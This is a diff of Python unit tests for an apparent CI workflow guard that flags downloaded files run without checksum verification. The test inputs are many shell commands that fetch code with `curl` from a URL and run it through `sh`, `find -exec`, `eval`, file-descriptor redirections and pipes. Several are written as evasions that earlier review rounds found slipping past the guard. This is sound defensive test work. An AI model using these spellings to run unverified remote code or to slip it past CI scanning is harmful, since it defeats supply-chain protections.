+                    "bash 3<> tool 4</dev/fd/3 3<&- <&4", "sh 3<> tool 4<>/dev/fd/3 3<&- <&4",
+                    "bash 3<> tool 0<>/dev/fd/3 3<&-", "sh /dev/fd/4 3<> tool 4</dev/fd/3 3<&-",
+                    "P=/dev/fd/3\nbash 3<> tool <$P 3<&-", "FD=3\nsh 3<> tool <&$FD 3<&-",
+                    "FD=3\nsh 3<> tool 4<&$FD 3<&- <&4", "sh 3<> tool <&$((3)) 3<&-",
+                    "sh 3<> tool <&$(echo 3) 3<&-"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_the_shell_a_find_runs_reads_what_n_holds_whatever_the_root(self):
+        # Round 4, the round-3 verdict's B2: `find` hands the shell it runs behind `-exec`, `-execdir`
+        # or `{} +` the descriptors it holds, so that shell reads what N holds whatever root `find`
+        # walks (AG001, AG013, AG019, AG031, AG037, AG055; `sudo`, AG061). The reader reads the command
+        # `use()` reads, through `workflow_operands.described`, by the same tests. Every shell runs it.
+        for use in ("find /dev/null -maxdepth 0 -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec sh \\; 3<> tool <&3", "find /etc/passwd -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -execdir sh /dev/fd/3 \\; 3<> tool", "find /dev/null -exec sh /dev/fd/3 {} + 3<> tool",
+                    "find /dev/null -exec sh \\; 3<> tool 4<&3 3<&- <&4",
+                    "sudo find /dev/null -exec sh /dev/fd/3 \\; 3<> tool"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+        import shell_command
+        import workflow_operands
+        self.assertEqual(workflow_operands._FIND_EXEC, shell_command._FIND_EXEC)
+
+    def test_each_way_the_rule_names_a_reader_of_what_n_holds(self):
+        # Round 4, the round-3 verdict's B3-B9: one row for each way the rule reads a command as one
+        # that reads what N holds -- a substitution head (AV011), `eval` (AV045, AO069), a foreign
+        # interpreter (AXI01, which the seat ran by hand with a python payload), a shell by its path
+        # (AN017), a wrapper or a group in front (UX18, UX19, UX03), the second of two held files
+        # (AXF01) -- each run by every shell, and `source` (UP257), run by bash alone.
+        for shells, uses in ((SHELLS, ("$(echo sh) 3<> tool <&3", "eval sh 3<> tool <&3", "eval 'sh <&3' 3<> tool",
+                                       "python3 3<> tool <&3", "/bin/sh 3<> tool <&3", "sudo sh 3<> tool <&3",
+                                       "env sh 3<> tool <&3", "{ sh 3<> tool <&3; }", "sh 3<> other 4<> tool <&4")),
+                             (self.BASH, ("source /dev/fd/3 3<> tool",))):
+            for use in uses:
+                for shell in shells:
+                    with self.subTest(use=use, shell=shell):
+                        self.assertTrue(reported(GET + use + "\necho done\n", shell))
+        # F2: a move leaves nothing on its source, so once its target closes nothing is held and no
+        # shell runs anything (AXM01, ffffffff).
+        for shell in SHELLS:
+            with self.subTest(use="moved, then closed", shell=shell):
+                self.assertFalse(reported(GET + "sh 3<> tool 4<&3- 4<&-\necho done\n", shell))
+
+    def test_each_path_of_n_the_reader_resolves_carries_what_n_holds(self):
+        # Round 5, the round-4 verdict's B1 and B2: `/dev/stdout` and `/dev/stderr` are paths of fd 1
+        # and fd 2 (FS01, FS08; past a climb or `//` too), and a climb to `/dev/fd/N` or
+        # `/proc/self/fd/N` is a path of N (FD211, FD231; through `./`, a `/proc` path the reader
+        # does not resolve, which carries every file held, fail-closed), so each carries what N holds
+        # onto standard input, and every shell runs the download. A symlink the step makes to one
+        # stays open (B3, #2919).
+        climb = "../" * 12
+        for use in ("sh 1<> tool </dev/stdout 1>/dev/null", "sh 2<> tool </dev/stderr 2>/dev/null",
+                    "sh 1<> tool <%sdev/stdout 1>/dev/null" % climb, "sh 2<> tool <//dev/stderr 2>/dev/null",
+                    "sh 3<> tool <%sdev/fd/3 3<&-" % climb, "dash 9<> tool <%sproc/self/fd/9 9<&-" % climb,
+                    "sh 3<> tool <./%sproc/self/fd/3 3<&-" % climb):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+        # F6: a path of 4 carries what 4 holds and no more, past `thread-self`, a doubled slash or a
+        # climb, so with `other` on 4 no shell runs the download (F6A, F6B; ffffffff). F1: a
+        # here-string's word is the shell's text, not a path, so it carries nothing, and the shell
+        # finds 3 closed.
+        for use in ("sh 3<> tool 4<> other </proc/thread-self/fd/4 3<&- 4<&-",
+                    "sh 3<> tool 4<> other </proc/self//fd/4 3<&- 4<&-",
+                    "sh 3<> tool 4<> other <%sproc/self/fd/4 3<&- 4<&-" % climb, "sh 3<> tool <<< /dev/fd/3 3<&-"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertFalse(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_check_named_through_a_value_is_credited_with_no_file_it_only_holds(self):
+        # Round 5, the round-4 verdict's B4: the check side credits `$X/sha256sum` as a check by its
+        # basename, so the reader hands it no file `N<>` only holds -- beside its operand (CK09), a
+        # path of N on 4 (CK16) or `0<> self` (CK10). Each checks the download against itself, and the
+        # use stays reported, the pinned digest right (the seat's payload's) or wrong.
+        for digest in ("4b6e6b7b4b378ba4396fd5218233be164d72462a8f28c6bdd08bd54fa2cfca66", "a" * 64):
+            pinned = 'echo "%s  tool" > sums\n%ssha256sum tool > self\nX=/usr/bin\n' % (digest, GET)
+            for check in ("$X/sha256sum -c self 3<> sums", "$X/sha256sum -c self 3<> sums 4</dev/fd/3 3<&-",
+                          "$X/sha256sum -c 0<> self 3<> sums"):
+                for shell in SHELLS:
+                    with self.subTest(digest=digest[:1], check=check, shell=shell):
+                        self.assertTrue(reported(pinned + check + "\nsh tool\necho done\n", shell))
+
+    def test_each_checksum_tool_named_through_a_value_is_handed_no_file_it_only_holds(self):
+        # Round 6, the round-5 verdict's B1: the exclusion is every checksum tool's
+        # (`shell_command._CHECKERS`), not `sha256sum`'s alone -- CK09's shape for each, the use
+        # reported under every setting.
+        import shell_command
+        for tool in shell_command._CHECKERS:
+            pinned = 'echo "%s  tool" > sums\n%s%s tool > self\nX=/usr/bin\n' % ("a" * 64, GET, tool)
+            for shell in SHELLS:
+                with self.subTest(tool=tool, shell=shell):
+                    self.assertTrue(reported(pinned + "$X/%s -c self 3<> sums\nsh tool\necho done\n" % tool, shell))
+
+    def test_find_runs_its_shell_behind_ok_and_by_its_path(self):
+        # Round 5, the round-4 verdict's B5 and B6: `find` runs the shell behind `-ok` and `-okdir`
+        # when it is answered yes (FX085, FX091), and `/usr/bin/find` is `find` (FX121), so that
+        # shell reads what 3 holds, and every shell runs the download. Round 6 (the round-5 verdict's
+        # B2): the shell a value names, `-exec $S` (FX283) -- the value arm reads the command word
+        # `find` runs, not the stage's first word.
+        for use in ("echo y > ans\nfind /dev/null -ok sh /dev/fd/3 \\; 3<> tool < ans",
+                    "echo y > ans\nfind /dev/null -okdir sh /dev/fd/3 \\; 3<> tool < ans",
+                    "/usr/bin/find /dev/null -exec sh /dev/fd/3 \\; 3<> tool",
+                    "S=sh\nfind /dev/null -exec $S /dev/fd/3 \\; 3<> tool"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_dup_a_value_decides_carries_each_file_each_descriptor_holds(self):
+        # Round 5, the round-4 verdict's B7 and B8: `<&$FD` carries every file held, not the first
+        # alone, and the shell reads each file a descriptor holds, not its first: with `other` on 3
+        # and the download on 4, every shell runs the download (CC09).
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(GET + "FD=4\nsh 3<> other 4<> tool <&$FD 3<&- 4<&-\necho done\n", shell))
+
+
+class TestEveryActionOfAFindIsRead(unittest.TestCase):
+    """#2918: `find` runs the command of each action it holds -- `-exec`, `-execdir`, `-ok` and
+    `-okdir`, in any order, past any test or operator -- and the guard read only the first, in a fixed
+    order, so one `-exec true \\;` in front of the shell passed it (the #2885 round-4 seat's F2: 84
+    rows, 420 cells, CLEAN on main while every parent runs the file)."""
+
+    def test_each_spelling_the_issue_names_reports(self):
+        # One row of each spelling #2918 lists, by the seat's ids: a shell in a later action (FX001,
+        # `-execdir` FX019), the fixed order's `-exec` behind an earlier `-execdir` (FX025), a failing
+        # or negated test in front (FX037, FX043, FX049), a word an action is handed (FX055), a `{} +`
+        # in front (FX061), the shell's standard input (FX073), `-ok` (FX103), a wrapper inside the
+        # action (FX193, FX199), and a command word `find` or bash decides (FX211, FX277). Every
+        # parent runs the download in each.
+        for use in ("find /dev/null -exec true \\; -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec true \\; -execdir sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -execdir sh /dev/fd/3 \\; -exec true \\; 3<> tool",
+                    "find /dev/null -exec false \\; -o -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null ! -name -exec -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -name -exec -o -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec echo -exec \\; -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec true {} + -exec sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec true \\; -exec sh \\; 3<> tool <&3",
+                    "echo y > ans\nfind /dev/null -exec true \\; -ok sh /dev/fd/3 \\; 3<> tool < ans",
+                    "find /dev/null -exec env sh /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec sudo sh /dev/fd/3 \\; 3<> tool",
+                    "find /usr/bin/sh -exec {} /dev/fd/3 \\; 3<> tool",
+                    "find /dev/null -exec $(echo sh) /dev/fd/3 \\; 3<> tool"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_later_action_is_read_as_the_first_one_is(self):
+        # Each way the guard reads the first action's use of a file, in a later one: a shell handed the
+        # file, the file run, a shell `{}` hands it, the shell's standard input, a printer piped to a
+        # shell, and a wrapper inside the action. Every parent runs the download.
+        for use in ("find /dev/null -exec true \\; -exec sh tool \\;", "find /dev/null -exec true \\; -exec ./tool \\;",
+                    "find . -name tool -exec true \\; -exec sh {} \\;",
+                    "find /dev/null -exec true \\; -exec sh \\; < tool",
+                    "find /dev/null -exec true \\; -exec cat tool \\; | sh",
+                    "find /dev/null -exec true \\; -exec env sh tool \\;"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_command_word_find_or_bash_decides_is_one_the_guard_cannot_read(self):
+        # Fail-closed, as a dynamic command word behind a wrapper is (`sudo $X`): `{}` is each path the
+        # search walks, and a `$` word or a substitution is what bash makes of it. The price: such an
+        # action reads as a command the guard cannot read wherever it runs, a download or none.
+        for use, why in (("find . -name '*.sh' -exec {} \\;", "`find` runs `{}`, a command word it or bash decides"),
+                         ("find . -exec $X {} \\;", "`find` runs `$X`, a command word it or bash decides"),
+                         ("find . -exec $(echo sh) {} \\;", "`find` runs `$(...)`, a command word it or bash decides"),
+                         ("find . -exec sudo $X {} \\;", "a command `find` runs: has a dynamic command operand")):
+            with self.subTest(use=use):
+                found = wg.job_defects([wg.Step("step", use + "\n", None)])
+                self.assertEqual(1, len(found))
+                self.assertIn("cannot read command: " + why, found[0][1])
+
+    def test_a_reason_a_command_in_an_action_gives_is_read_as_at_the_top_level(self):
+        # What the guard cannot read in front of a command it cannot read inside an action either: a
+        # pattern where the shell looks for `-c` or a script, and more wrappers than it unwraps. Each
+        # reads so on its own line too.
+        for command, why in (("sh -[c] x", "`-[c]` is a pattern bash expands where `sh` looks for `-c`"),
+                             ("env " * 17 + "sh x", "has too many nested wrappers")):
+            for use in (command, "find . -exec %s \\;" % command):
+                with self.subTest(use=use):
+                    found = wg.job_defects([wg.Step("step", use + "\n", None)])
+                    self.assertEqual(1, len(found))
+                    self.assertIn(why, found[0][1])
+
+    def test_a_check_find_runs_is_credited_with_nothing(self):
+        # `find` exits 0 though a `-exec … \;` command fails, so a check one of its actions runs stops
+        # nothing: the action is read as a use, never as a check, as main reads it -- beside the same
+        # check run on its own, which clears the use.
+        sums = "echo '%s  tool' > sums\n" % ("a" * 64)
+        self.assertFalse(reported(GET + sums + "sha256sum -c sums\nsh tool\n"))
+        self.assertTrue(reported(GET + sums + "find /dev/null -exec sha256sum -c sums \\;\nsh tool\n"))
+
+    def test_each_action_ends_at_its_own_terminator(self):
+        # `;` ends an action, and `+` only right after `{}`; a word an operand spells `-exec` starts one
+        # too, failing closed; the same action twice is read once.
+        import shell_command
+        cases = (("find . -exec true {} + -exec sh x ;", [["true", "{}"], ["sh", "x"]]),
+                 ("find . -exec echo + ; -exec sh x ;", [["echo", "+"], ["sh", "x"]]),
+                 ("find . -exec echo -exec ; -exec sh x ;", [["echo", "-exec"], [], ["sh", "x"]]),
+                 ("find . -name -exec -o -exec sh x ;", [["-o", "-exec", "sh", "x"], ["sh", "x"]]),
+                 ("find . -exec true ; -exec true ;", [["true"]]), ("find . -exec sh x", [["sh", "x"]]),
+                 ("xargs -exec sh x ;", []))
+        for text, actions in cases:
+            with self.subTest(text=text):
+                self.assertEqual(actions, shell_command._actions(text.split()))
+
+    def test_the_folds_read_each_action_up_to_the_cap_and_no_further(self):
+        # One fold reads each distinct action where the guard asks how a stage uses a file; past
+        # `_FIND_CAP` the `find` reads as a command the guard cannot read, its first action alone, so
+        # neither the scan nor the folds grow with its words.
+        import shell_command
+        cap = 8
+        self.assertEqual(cap, shell_command._FIND_CAP)
+        for count, folds in ((1, 1), (3, 3), (cap, cap), (cap + 1, 1), (500, 1)):
+            argv = ["find", "."] + [word for n in range(count) for word in ("-exec", "echo", str(n), ";")]
+            with self.subTest(count=count):
+                read = [shell_command.find_action(argv) for _sure in shell_command.folds(lambda: False)]
+                self.assertEqual(folds, len(read))
+                self.assertEqual([["echo", str(n)] for n in range(folds)], read)
+                self.assertEqual(count > cap, bool(shell_command.unresolved_wrapper(argv)))
+
+
+class TestEveryFindActionIsACommand(unittest.TestCase):
+    """#2935: but for the reader that asks how a stage uses a file (#2918), the guard never saw the
+    command an action of a `find` runs -- the first one too -- so a download an action fetches, a
+    program it runs, or a stream piped into its shell read CLEAN while every parent runs it.
+    `shell_reader.acted()` answers with that command, the `find` unwrapped as a wrapper is, for the
+    readers `ACTED` names and no other; `command()` is `main`'s (round 3). `shell_command.folds` reads
+    a job as `main` does first, then again with each action in its `find`'s place, and the guard
+    REPORTs where either reading holds a defect: `main`'s reading is never lost. An action that runs a
+    check keeps the `find`, and a program an action runs has no shell sure to read it (`unsure`):
+    `find` exits 0 though a `-exec … \\;` command fails, so nothing an action runs is credited."""
+
+    @staticmethod
+    def marked(script):
+        """R or C for `script` under each of the five `shell:` settings."""
+        return "".join("CR"[reported(script, shell)] for shell in SHELLS)
+
+    def test_each_reader_sees_the_action(self):
+        # The #2935 hunt's families, by its ids, every parent running each: a fetch in an action
+        # (F-first-sh, F-later-bash, F-dir-chmod, F-ok-sh, F-sudo-sh), an action's `-c` program
+        # (C-first-stream, C-orfail-file), an action's `-c` running a download (D-first), and a
+        # download piped into the shell an action runs (P-first-sh, P-later-bash).
+        for use in ("find /dev/null -exec curl -fsSLo tool %stool \\;\nsh tool" % URL,
+                    "find /dev/null -exec true \\; -exec curl -fsSLo tool %stool \\;\nbash tool" % URL,
+                    "find . -maxdepth 0 -execdir curl -fsSLo tool %stool \\;\nchmod +x tool && ./tool" % URL,
+                    "echo y > ans\nfind /dev/null -ok curl -fsSLo tool %stool \\; < ans\nsh tool" % URL,
+                    "find /dev/null -exec sudo curl -fsSLo tool %stool \\;\nsh tool" % URL,
+                    "find /dev/null -exec sh -c '%s' \\;" % PIPE,
+                    "find /dev/null -exec false \\; -o -exec bash -c 'curl -fsSLo t %st; sh t' \\;" % URL,
+                    GET + "find /dev/null -exec sh -c 'sh tool' \\;",
+                    "curl -fsSL %si.sh | find /dev/null -exec sh \\;" % URL,
+                    "curl -fsSL %si.sh | find /dev/null -exec true \\; -exec bash -s \\;" % URL):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(use + "\necho done\n", shell))
+
+    # The download as the step fetches it and as an action does: `main` sees the first and not the
+    # second, so a row on the second holds what the folds that read actions read, with no reading of
+    # `main`'s beside it to report in its place (round 3).
+    FETCHED = "find /dev/null -exec curl -fsSLo tool %stool \\;\n" % URL
+
+    def test_nothing_an_action_runs_is_credited(self):
+        # A check an action runs, as its command, in its `-c` program, or read off its shell's standard
+        # input, with the wrong digest or the right one, clears nothing (the hunt's K rows): `main`
+        # reads each so, and the folds that read actions keep it (`_found` keeps the `find` of a
+        # check; `unsure`) -- beside the same check run on its own, which stops the step where `-e`
+        # holds.
+        sums = "echo '%s  tool' > sums\n" % ("a" * 64)
+        for get in (GET, self.FETCHED):
+            self.assertEqual("CCCRR", self.marked(get + sums + "sha256sum -c sums\nsh tool\n"))
+            for check in ("find /dev/null -exec sha256sum -c sums \\;", "find /dev/null -exec sh -c 'sha256sum -c sums' \\;",
+                          "find /dev/null -exec true \\; -exec bash -c 'sha256sum -c sums' \\;",
+                          "find /dev/null -exec sh \\; <<'EOF'\nsha256sum -c sums\nEOF"):
+                with self.subTest(get=get, check=check):
+                    self.assertEqual("RRRRR", self.marked(get + sums + check + "\nsh tool\n"))
+
+    def test_the_roots_still_stand_in_for_the_braces(self):
+        # `use()` asks how a stage uses a file through `command()`, the `find`, so
+        # `workflow_operands.described` reads the action with the `find`'s roots for its `{}` as on
+        # `main` (#2918), in the folds that read actions too: round 3 needs no hunk there.
+        found = wg.job_defects([wg.Step("step", GET + "find . -name tool -exec chmod +x {} \\;\n", None)])
+        self.assertEqual(1, len(found))
+        self.assertIn("making it executable", found[0][1])
+
+    def test_a_find_that_fetches_and_runs_nothing_reads_clean(self):
+        # The hunt's benign finds: nothing downloads, nothing runs a download -- the price, none.
+        for use in ("find . -name '*.pyc' -exec rm -f {} \\;", "find . -type f -exec chmod 644 {} +",
+                    "find . -name '*.sh' -exec bash -n {} \\;", "find . -exec sh -c 'echo \"$1\"' _ {} \\;",
+                    "find . -name x -exec true \\; -exec echo found \\;", "find . -name '*.log' -exec gzip -f {} \\;"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertFalse(reported(use + "\n", shell))
+
+    # Round 2, the round-1 seat's B1 and its price. The download fetched, a wrong digest in `sums`,
+    # and the frames an action runs in, by the seat's probes: first, behind `sudo`, in a `find`
+    # behind `env`, by `-execdir`, and after `-o`.
+    SUMS = "echo '%s  tool' > sums\n" % ("a" * 64)
+    CHECK = "sha256sum -c sums"
+    FRAMES = ("find /dev/null -exec %s \\;", "find /dev/null -exec sudo %s \\;", "env find /dev/null -exec %s \\;",
+              "find . -maxdepth 0 -execdir %s \\;", "find /dev/null -exec false \\; -o -exec %s \\;")
+
+    def marks(self, lines):
+        """R or C under each of the five settings: the download fetched, `lines`, then the run."""
+        return self.marked(GET + self.SUMS + lines + "\nsh tool\n")
+
+    def test_an_action_is_no_stop_of_the_step(self):
+        # B1 of round 1's seat, the status walk (`workflow_function_calls`, which reads a stage's
+        # status off `command()`, the `find`): GNU find 4.9.0 exits 0 whatever a `-exec … \\;` command
+        # returns, and no `find` runs `exit` or `return`, so a check's rescue written as an action
+        # stops nothing and every parent runs the download with the wrong digest. `main` reports each;
+        # round 1 read the action as the rescue written alone (the seat's S01, S02, S05-S07, S13-S15,
+        # S17, E10, E15, E16, T06 and T09) -- the controls below, which read as they did.
+        check, first = self.CHECK, self.FRAMES[0]
+        for frame in self.FRAMES:
+            for rescue in ("%s || " + frame % "false", "%s || " + frame % "exit 1"):
+                with self.subTest(rescue=rescue):
+                    self.assertEqual("RRRRR", self.marks(rescue % check))
+        for rescue in ("%s || " + first % "exit", "%s || " + first % "return 1",
+                       "%s || { echo bad; " + first % "exit 1" + "; }", "%s || { echo bad; " + first % "false" + "; }",
+                       "%s || ( " + first % "exit 1" + " )", "( %s || " + first % "exit 1" + " )",
+                       "%s || " + first % "exit 1" + " || exit 1", "%s || " + first % "exit 1" + " || true",
+                       "set +e\n%s || " + first % "exit 1", "set -e\n%s || " + first % "false",
+                       "f() {\n  %s || " + first % "return 1" + "\n}\nf", "f() {\n  %s || " + first % "false" + "\n}\nf"):
+            with self.subTest(rescue=rescue):
+                self.assertEqual("RRRRR", self.marks(rescue % check))
+        for control, marks in (("%s || exit 1", "CCCCC"), ("%s || false", "CCCRR"), ("%s", "CCCRR"),
+                               ("f() {\n  %s || exit 1\n}\nf", "CCCCC")):
+            with self.subTest(control=control):
+                self.assertEqual(marks, self.marks(control % check))
+
+    def test_an_action_is_no_call_of_a_function(self):
+        # B1 of round 1's seat, the call detection: no `find` runs a shell function, so a function an
+        # action names is not called -- neither as the path to the function holding the check
+        # (`workflow_function_calls`; the seat's S10 and E13) nor as a piped call (`workflow_gating`;
+        # E03, E04, which round 1 read CLEAN under `shell: bash`). Beside each, the call written
+        # alone, read as it was.
+        body = "f() {\n  %s\n}\n" % self.CHECK
+        for frame in self.FRAMES:
+            named = frame % "f"
+            for call in ("g() {\n  %s\n}\ng" % named, "set -e\ng() {\n  %s\n}\ng" % named, named + " | cat",
+                         "{ %s; } | cat" % named, named):
+                with self.subTest(call=call):
+                    self.assertEqual("RRRRR", self.marks(body + call))
+        for control, marks in (("f", "CCCRR"), ("g() {\n  f\n}\ng", "CCCRR"), ("f | cat", "RCRRR")):
+            with self.subTest(control=control):
+                self.assertEqual(marks, self.marks(body + control))
+
+    def test_mains_reading_of_a_find_is_never_lost(self):
+        # Round 3, the round-2 verdict's B1: `main`'s reading is never lost. What the step itself does is
+        # read off `command()`, the `find` -- by every reader `ACTED` does not name -- and `folds` reads
+        # the job as `main` does before it reads an action. The seat's four groups, each REPORT on `main`
+        # and CLEAN at round 2's head while every parent runs it; the words are the seat's.
+        valued = GET + "T=tool\nfind /dev/null -exec %s \\;\nsh %s\n"
+        rows = (
+            # (a) the value readers (`workflow_uses._cleared`, `workflow_values.record`): no `find` sets
+            # or clears a variable of the step's, so the name still holds the download.
+            *(valued % (action, use) for use in ('"$T"', "$T") for action in (
+                "read T", "printf -v T x", "mapfile T", "readarray T", "getopts a T", "command unset T", "command local T",
+                "/usr/bin/unset T", "env read T", "sudo read T")),
+            # (b) the sums-file writer (`workflow_checks._record_writes`): a `tee` an action runs is not
+            # the step's own write of the file its check reads -- here `find` never reaches the action,
+            # and the sums the check reads are the download's own digest, which passes.
+            *(GET + "sha256sum tool > sums\necho '%s  tool' | find %s -exec %s \\;\nsha256sum -c sums\nsh tool\n" % (
+                "a" * 64, test, tee) for test in (". -name nomatch", "/dev/null -false")
+              for tee in ("tee sums", "tee -a sums", "sudo tee sums", "command tee sums")),
+            # (c) the printers (`workflow_printers.producer`, `_passes_through`): what a `find` prints is
+            # its own `-printf` line, whatever its action prints, and the printer in front of it is not
+            # known to arrive intact.
+            *(GET + "echo 'echo hi' | find . -maxdepth 0 -printf 'sh tool\\n' %s \\; | sh\n" % action
+              for action in ("-execdir echo true", "-execdir printf 'true\\n'", "-exec cat", "-exec tee log")),
+            # (d) the `xargs` walk (`workflow_operands.described`): a `find` with an action still hands
+            # `xargs` its walk.
+            *(GET + "find %s | xargs %s\n" % (walk, runner) for runner in ("sh", "-n1 bash") for walk in (
+                "tool -print -exec true \\;", ". -name tool -exec true \\; -print", ". -name tool -exec echo {} \\;")),
+        )
+        for row in rows:
+            with self.subTest(row=row):
+                self.assertEqual("RRRRR", self.marked(row))
+
+    def test_the_folds_read_a_job_as_main_does_before_they_read_an_action(self):
+        # The shape that holds it. `command()` never unwraps a `find`; `acted()` is `command()`
+        # outside a fold that reads actions; and `folds` yields `main`'s folds first -- one for each
+        # action of the `find` with the most (#2918), `acted` the `find` in each -- then, where
+        # `acted` met a `find` with an action in them, the same folds with the action in place. A job
+        # with no such `find` gets no fold more than `main` gives it.
+        import shell_command
+        import shell_wrappers
+        stage = shell_reader.statements("sudo find /dev/null -exec env sh -c x \\; -exec true \\;\n")[0].stages[0]
+        find = ["find", "/dev/null", "-exec", "env", "sh", "-c", "x", ";", "-exec", "true", ";"]
+        self.assertEqual((find, find), (shell_reader.command(stage.argv), shell_reader.acted(stage.argv)))
+        self.assertIs(stage.argv, shell_reader.acted(stage.argv, True))
+        read = []
+        for sure in shell_command.folds(lambda: False):
+            shell_command.find_action(find)                     # as `described` asks: one fold an action
+            read.append((sure, shell_reader.command(stage.argv), shell_reader.acted(stage.argv),
+                         shell_reader.acted(stage.argv, True)))
+        self.assertEqual([False] * 4, [sure for sure, *_ in read])
+        self.assertEqual([find] * 4, [command for _, command, *_ in read])
+        self.assertEqual([find, find, ["sh", "-c", "x"], ["true"]], [acted for *_, acted, _ in read])
+        self.assertEqual([shell_wrappers.Found] * 2, [type(acted[0]) for *_, acted, _ in read[2:]])
+        self.assertTrue(all(own is stage.argv for *_, own in read[:2]))
+        self.assertEqual([["sh", "-c", "x"], ["true"]], [own for *_, own in read[2:]])
+        self.assertEqual(find, shell_reader.acted(stage.argv))  # and `main`'s again, the folds done
+        # Every fold of `main`'s comes first: with a command word bash may expand to nothing beside
+        # the `find`, both of its halves are read with no action in place, then each again with each
+        # of the two actions.
+        half = shell_reader.statements("${X:+/usr/bin/env true} sh -c x\n")[0].stages[0]
+        read = []
+        for _sure in shell_command.folds(lambda: False):
+            read.append((shell_reader.command(half.argv)[0], shell_reader.acted(stage.argv)[0]))
+        self.assertEqual([("true", "find"), ("sh", "find"), ("true", "sh"), ("true", "true"), ("sh", "sh"), ("sh", "true")], read)
+        # A job with no such `find` is read in `main`'s folds alone -- though `acted` was asked about
+        # one outside any fold just before: `folds` starts every job with none met.
+        plain, count = shell_reader.statements("sudo sh -c x\n")[0].stages[0], 0
+        shell_reader.acted(stage.argv)
+        for _sure in shell_command.folds(lambda: False):
+            count += 1
+            self.assertIs(plain.argv, shell_reader.acted(plain.argv, True))
+        self.assertEqual(1, count)
+        # A reader that asks whether a command is known to fail asks `command()`: `find` is not.
+        import workflow_failure_contexts
+        known = [workflow_failure_contexts._known_failure(shell_reader.statements(text)[0])
+                 for text in ("false\n", "find /dev/null -exec false \\;\n", "find /dev/null -exec exit 1 \\;\n")]
+        self.assertEqual([True, False, False], known)
+
+    def test_the_string_walk_hands_command_the_strings_own_words(self):
+        # `workflow_programs._details` keeps its one `command()` call (#2858 pins it), handed
+        # `acted(argv, True)`: the string's own words -- the very list -- wherever no action stands
+        # in their place, so `main`'s reading of a string is `main`'s own call on `main`'s own
+        # argument, and the action's command in a fold that reads actions.
+        import shell_command
+        import shell_wrappers
+        import workflow_programs
+        from unittest import mock
+        text = "find /dev/null -exec sh \\;"
+        argv = shell_reader.statements("bash -c '%s'\n" % text)[0].stages[0].argv
+        own, handed, real = workflow_programs._parsed(text)[0].stages[0].argv, [], shell_reader.command
+
+        def command(words):
+            handed.append(words)
+            return real(words)
+        with mock.patch.object(shell_reader, "command", command):
+            workflow_programs._details(argv, 0, workflow_programs._MAIN)
+            with mock.patch.dict(shell_command._ACTIONS, act=True):
+                workflow_programs._details(argv, 0, workflow_programs._MAIN)
+        self.assertEqual(2, len(handed))
+        self.assertIs(own, handed[0])
+        self.assertEqual((["sh"], shell_wrappers.Found), (handed[1], type(handed[1][0])))
+
+    # Every caller of the unwrapped reading, as (module, function), with the row that needs it there:
+    # CLEAN on `main`, REPORT here, and CLEAN again where that one caller reads `command()` instead.
+    ACTED = {
+        ("workflow_forms", "flattened"): "find /dev/null -exec sh -c '%s' \\;\n" % PIPE,
+        ("workflow_guard", "_walk"): FETCHED + "sh tool\n",
+        ("workflow_guard", "_unread_stdin"): GET + "T=tool\nfind /dev/null -exec sh \\; <<EOF\nsh $T\nEOF\n",
+        ("workflow_fetch", "stdout_fetch"): "x=$(find /dev/null -exec curl -fsSL %si.sh \\;)\nsh -c \"$x\"\n" % URL,
+        ("workflow_fetch", "stream_consumer"): "curl -fsSL %si.sh | find /dev/null -exec sh \\;\n" % URL,
+        ("workflow_fetch", "compound_output"): "curl -fsSL %stool | find /dev/null -exec tee tool \\;\nsh tool\n" % URL,
+        ("workflow_programs", "_details"): GET + "bash -c 'find /dev/null -exec sh \\;' <<'EOF'\nsh tool\nEOF\n",
+        ("workflow_programs", "stdin_scripts"): GET + "find /dev/null -exec echo 'sh tool' \\; | sh\n",
+        ("workflow_printers", "producer"): GET + "find /dev/null -exec printf '%s\\n' 'sh tool' \\; | bash\n",
+        ("workflow_printers", "handed"): GET + "T=tool\nfind /dev/null -exec cat \\; <<EOF | sh\nsh $T\nEOF\n",
+        ("workflow_printers", "unspelled"): GET + "X='sh tool'\nfind /dev/null -exec echo \"$X\" \\; | sh\n",
+        ("workflow_printers", "_printer"): GET + "source <(find /dev/null -exec echo 'sh tool' \\;)\n",
+        ("workflow_uses", "copies"): GET + "find /dev/null -exec cp tool t2 \\;\nsh t2\n",
+        ("workflow_uses", "use"): GET + "cat tool | find /dev/null -exec sh \\;\n",
+    }
+
+    def test_every_caller_of_the_unwrapped_reading_is_named(self):
+        # Round 3, the round-2 verdict's B1, ruling 3: read from the AST, not the text. Every mention
+        # of `acted` in the scripts -- a call, a name bound to it, an import, the word in a string --
+        # is its definition, the reader's re-export, or a call `shell_reader.acted(…)` in a function
+        # `ACTED` names, once each; and `finds`, the argument that unwraps, is passed by `acted` alone.
+        import shell_command
+        import ast
+        import pathlib
+        calls, other, finds, chain = [], [], [], []
+        for path in sorted(pathlib.Path(shell_command.__file__).parent.glob("*.py")):
